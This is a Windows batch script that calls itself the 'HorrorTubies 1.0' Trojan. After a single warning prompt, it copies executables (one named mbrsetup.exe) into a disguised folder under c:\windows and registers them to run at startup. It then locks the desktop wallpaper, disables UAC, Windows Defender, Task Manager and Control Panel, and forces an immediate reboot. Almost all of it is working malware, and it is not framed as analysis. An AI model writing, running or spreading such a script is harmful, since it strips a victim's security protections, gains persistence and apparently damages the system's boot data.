@echo off
title HorrorTubies 1.0
echo This Trojan is no joke, do you want to run it?
pause
md c:\windows
md c:\windows\winbase_base_procid_none
md c:\windows\winbase_base_procid_none\secureloc0x65
copy /y gdifuncs.exe c:\windows\winbase_base_procid_none\secureloc0x65
copy /y mainbgtheme.wav c:\windows\winbase_base_procid_none\secureloc0x65
copy /y mbrsetup.exe c:\windows\winbase_base_procid_none\secureloc0x65
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v mbrsetup /d c:\windows\winbase_base_procid_none\secureloc0x65\mbrsetup.exe /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v gdifuncs /d c:\windows\winbase_base_procid_none\secureloc0x65\gdifuncs.exe /f
copy /y bg.bmp c:\
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\bg.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg.exe ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoChangingWallPaper /t REG_DWORD /d 1 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f
shutdown /r /t 00